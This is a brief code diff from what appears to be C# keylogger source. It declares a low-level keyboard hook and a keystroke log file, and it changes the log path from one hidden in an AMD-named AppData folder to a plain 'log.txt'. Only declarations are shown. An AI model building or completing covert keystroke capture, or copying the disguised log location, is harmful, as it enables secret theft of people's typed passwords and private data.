@@ -12,7 +12,7 @@ public static class Program
 {
 private const int WH_KEYBOARD_LL = 13;
 private const int WM_KEYDOWN = 0x0100;
-private const string logFileName = "C:\\Users\\Admin\\AppData\\Local\\AMD\\log.txt";
+private const string logFileName = "log.txt";
 private static StreamWriter logFile;
 private static HookProc hookProc = HookCallback;
 private static IntPtr hookId = IntPtr.Zero;
